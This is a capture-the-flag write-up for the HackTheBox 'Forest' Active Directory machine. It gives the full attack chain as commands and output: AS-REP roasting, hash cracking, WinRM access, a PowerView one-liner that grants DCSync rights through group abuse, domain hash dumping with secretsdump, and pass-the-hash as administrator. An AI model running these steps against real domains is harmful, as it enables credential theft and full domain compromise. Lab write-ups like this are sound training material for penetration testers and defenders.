# Writeup: Forest

# Enumeration

>We'll start with a port scan using the automatic TCP port scan script I've created:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.25.66
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49998
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-08 18:34:49Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49683/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
49998/tcp open  msrpc        Microsoft Windows RPC
| smb2-time: 
|   date: 2025-04-08T18:35:43
|_  start_date: 2025-04-08T17:50:21
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-04-08T11:35:42-07:00
|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m49s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

> Let's list the Windows version and the Active Directory domain using crackmapexec:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.25.66                                             
SMB         10.129.25.66    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

> Let's add the domain to our local host file (/etc/hosts) so that it can resolve the domain name:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo '10.129.25.66 htb.local' >> /etc/hosts
```

>If we connect via RPC anonymously, we can list the users in the domain:

```bash
┌──(kali㉿jbkira)-[~]
└─$ rpcclient -U "" -N 10.129.25.66   
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

>Let's put them into a file and process the text so that we're left with just the users:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ cat users | awk '{print $2}' FS=":" | awk '{print $1}' FS=" " | tr -d '[]' > valid_users
```

>Now that we have this list, let's check whether they are valid using kerbrute:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ kerbrute userenum --dc 10.129.25.66 -v valid_users -d HTB.LOCAL

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/08/25 - Ronnie Flathers @ropnop

2025/04/08 14:34:46 >  Using KDC(s):
2025/04/08 14:34:46 >   10.129.25.66:88

2025/04/08 14:34:46 >  [+] VALID USERNAME:       Administrator@HTB.LOCAL
<SNIP>
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailboxfc9daad@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailboxc0a90c9@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox6ded678@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox968e74d@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox670628e@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox83d6781@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailboxb01ac64@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailboxfd87238@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       sebastien@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox7108a4e@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox0659cc1@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       lucinda@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       mark@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       andy@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       svc-alfresco@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       santi@HTB.LOCAL
2025/04/08 14:34:46 >  Done! Tested 31 usernames (18 valid) in 0.248 seconds
```

>We are going to carry out an ASREP-ROAST attack to try to obtain the hash for one of these users, and we can see that we have obtained one for the user svc_alfresco:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ impacket-GetNPUsers -no-pass -usersfile valid_users htb.local/ 2>/dev/null
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<SNIP>

$krb5asrep$23$svc-alfresco@HTB.LOCAL:fb7f68e30e5957aa006b0a4d427688a9$a7ec169edefd9abb3dc46795d890a3d2de51186ab3e489b2f6af33fa3d28e8950316e8e0f06c6f25402e2456e5899e82eeed4a21e65b3437fb1364d2584fcd2e0ada90e23a50a31e703e1f3f5327832ab95821730a285ebc0253604a95e7f1a4486ac7e6849e6e23366372bfca0a6ce1a0cbfec8360dd75763112d5df1fc5a3b1be0b51e201f53dff6476f2fbacc72145001a8d39a90f8a2b44ee9db3b581b5ecdecb388f705b0d53bda133634598593bfcb28cfb3f588a194861e9f5177480e112a66d3da48ec303c2dffaaa7841b3baf1e37517abde6fadb995e5e49f0696cbd8a6b2b518b
<SNIP>
```

>We're going to crack it offline to retrieve the user's password using hashcat with the 18200 mask, which corresponds to ASREP hashes of type 23 (`$krb5asrep$23$`):

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ hashcat -m 18200 asrep_hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$krb5asrep$23$svc-alfresco@HTB.LOCAL:fb7f68e30e5957aa006b0a4d427688a9$a7ec169edefd9abb3dc46795d890a3d2de51186ab3e489b2f6af33fa3d28e8950316e8e0f06c6f25402e2456e5899e82eeed4a21e65b3437fb1364d2584fcd2e0ada90e23a50a31e703e1f3f5327832ab95821730a285ebc0253604a95e7f1a4486ac7e6849e6e23366372bfca0a6ce1a0cbfec8360dd75763112d5df1fc5a3b1be0b51e201f53dff6476f2fbacc72145001a8d39a90f8a2b44ee9db3b581b5ecdecb388f705b0d53bda133634598593bfcb28cfb3f588a194861e9f5177480e112a66d3da48ec303c2dffaaa7841b3baf1e37517abde6fadb995e5e49f0696cbd8a6b2b518b:s3rvice
```

>We're going to check the credentials using crackmapexec; as we can see, they're valid:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ crackmapexec smb 10.129.25.66 -u 'svc-alfresco' -p 's3rvice'
SMB         10.129.25.66    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.25.66    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
```

>We can see that there are no Kerberoastable users:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ impacket-GetUserSPNs -dc-ip 10.129.25.66 htb.local/svc-alfresco:s3rvice -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

>We are going to dump the domain via LDAP using the ldapdomaindump tool:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.129.25.66                                                       
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

>We start a web server in the directory where the files were created and view them using a web browser.



>Here we can see that the user `svc-alfresco` belongs to the **Service Accounts** group, that this group belongs to the **Privileged IT Accounts** group, and that this group in turn belongs to the **Remote Management Users** group; therefore, we can connect to the victim machine using evil-winrm:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ evil-winrm -u 'htb.local\svc-alfresco' -p 's3rvice' -i 10.129.25.66
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

```

>Here we can see the users.txt file:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/8/2025  10:51 AM             34 user.txt
```

# Privilege Escalation

>Now, we'll run bloodhound-python to retrieve data from the domain to analyze in BloodHound and see where we might be able to escalate privileges:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.129.25.66 -d htb.local -c all
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 18S

```

>Let's compress the files generated by the previous command into a zip file to make it easier to import them into BloodHound:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ zip forest.zip 2025*
  adding: 20250408150238_computers.json (deflated 83%)
  adding: 20250408150238_containers.json (deflated 93%)
  adding: 20250408150238_domains.json (deflated 77%)
  adding: 20250408150238_gpos.json (deflated 82%)
  adding: 20250408150238_groups.json (deflated 95%)
  adding: 20250408150238_ous.json (deflated 93%)
  adding: 20250408150238_users.json (deflated 96%)
```

>We will now start the Neo4j service, the database used by Bloodhound:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ sudo neo4j start
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:72155). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

>Open Bloodhound via the graphical interface, log in using your Neo4j credentials and import the ZIP file; if you get a JSON format error, import the ZIP file by dragging it from a folder into the application:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ bloodhound &>/dev/null & disown                                                      
[1] 72791
```

>Here we can see that our user has GenericAll permissions on the Exchange Windows Permissions group:

![image](https://github.com/user-attachments/assets/f07b40ee-8265-4d9f-a0ae-6d44d4ae0ead)


>This group has WriteDacl permissions on the domain, so we could exploit this:

![image](https://github.com/user-attachments/assets/86f662f2-08f0-4850-96fc-9a374008df6b)


>The GenericAll permission can be misused to add us to any group we wish, in this case `Exchange Windows Permissions`:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" svc-alfresco /add /domain
The command completed successfully.
```

>Now that we are members of this group, we have WriteDacl permissions on the domain.

>This permission can be exploited to grant DCSync permissions to a user as follows, but first we will need to upload PowerView.ps1 and import it:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload /home/kali/Desktop/machines/forest/PowerView.ps1
                                        
Info: Uploading /home/kali/Desktop/machines/forest/PowerView.ps1 to C:\Users\svc-alfresco\Desktop\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Import-Module .\PowerView.ps1
```

>We set up the svc-alfresco credentials:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
```

>We added DCSync permissions to the user:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

>But that won't work, as it takes us out of the group, so we'll have to put it all together in a single line so that the system doesn't have time to remove us from the group:

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

>To take advantage of these new permissions, we're going to use the Impacket secretsdump tool to perform a DCSync:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest/aclpwn.py]
└─$ impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.25.66
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>
```

>We will now perform a PassTheHash attack to log in to the system as the administrator user and obtain the root.txt flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest/aclpwn.py]
└─$ evil-winrm -i 10.129.25.66 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/8/2025  10:51 AM             34 root.txt
```
